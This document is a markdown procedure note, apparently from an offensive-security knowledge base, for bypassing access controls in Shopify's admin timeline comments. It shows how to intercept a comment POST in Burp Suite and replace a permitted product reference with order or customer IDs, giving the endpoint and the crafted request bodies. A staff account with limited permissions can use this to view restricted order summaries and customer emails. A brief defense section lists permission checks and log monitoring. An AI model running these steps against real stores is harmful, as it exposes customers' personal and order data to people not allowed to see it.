---
id: proc-shopify-craft-bypass
tags:
  - access-bypass
  - information-disclosure
  - shopify
  - idor
type: procedure
tools:
  - '[[tools/Burp-Suite]]'
tactics:
  - '[[Collection]]'
commands:
  - '[[commands/Submit-Order-Reference-in-Timeline-Comment]]'
  - '[[commands/Submit-Customer-Reference-in-Timeline-Comment]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Account Discovery]]'
updated_at: '2025-12-14T17:24:56.807Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Collection]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Account Discovery]]'
---
# Bypass-Access-Controls-via-Crafted-Comment-References

## Summary

This procedure exploits the lack of backend permission validation in Shopify's admin comment reference resolution by intercepting and modifying POST requests to insert IDs of restricted resources, leading to unauthorized disclosure of order summaries, customer details, and more.

## Description

Shopify's timeline comments allow references in the format [#<Type><ID>|Text], where the system resolves and displays resource summaries without re-checking the staff's permissions for the referenced item. By using Burp Suite to alter a permitted request's body parameter, attackers can force display of hidden data. This targets the /admin/transfers/<ID>/timeline_comments endpoint in the web-based Shopify admin, assuming a limited-permission session. Outcomes include visible sensitive information in comments, bypassing UI restrictions.

## Requirements

1. Burp Suite configured as a proxy for the browser
2. Active Shopify admin session with limited permissions
3. Known IDs for restricted resources (e.g., order or customer IDs from other sources)
4. Access to a permitted transfer ID

## Defense

Defensive measures and detection strategies:

- Enforce permission checks during reference parsing and rendering in comments
- Sanitize and validate all user-supplied IDs in request bodies against user roles
- Monitor admin API logs for unusual reference patterns or high-frequency comment submissions

## Objectives

1. Intercept and modify comment submission requests
2. Trigger unauthorized data disclosure via crafted references
3. Extract sensitive order and customer information

## Instructions

### Step 1: Post Permitted Comment and Intercept

**Context**: Create a baseline request with a permitted reference to capture the structure.

Use Burp Suite to intercept; no direct command, but prepare with [[commands/Submit-Order-Reference-in-Timeline-Comment]] format:

```http
POST /admin/transfers/<ID>/timeline_comments HTTP/1.1
Host: <store>.myshopify.com
...
Content-Type: multipart/form-data; boundary=...

timeline_comment[body]=[#P<product_ID>|Product Name]
```

> Intercept in Burp; ensure it posts successfully with permitted reference rendering.

### Step 2: Modify for Restricted Reference

**Context**: Alter the body to target restricted resources and forward.

Execute [[commands/Submit-Order-Reference-in-Timeline-Comment]] or [[commands/Submit-Customer-Reference-in-Timeline-Comment]] in the intercepted request:

For orders:

```http
timeline_comment[body]=[#O<order_ID>|Order #1005]
```

For customers:

```http
timeline_comment[body]=[#C<customer_ID>|Customer Name]
```

> Forward the request; refresh the comments to see disclosed details like order summary or customer email/photo.

## MITRE ATT&CK Mapping

### Tactics

- [[Collection]]

### Techniques

- [[Exploit Public-Facing Application]]
- [[Account Discovery]]

### Sub-Techniques


## Commands Used

- [[commands/Submit-Order-Reference-in-Timeline-Comment]]
- [[commands/Submit-Customer-Reference-in-Timeline-Comment]]

## Tools Used

- [[tools/Burp-Suite]]

## Tags

- access-bypass
- information-disclosure
- shopify
- idor
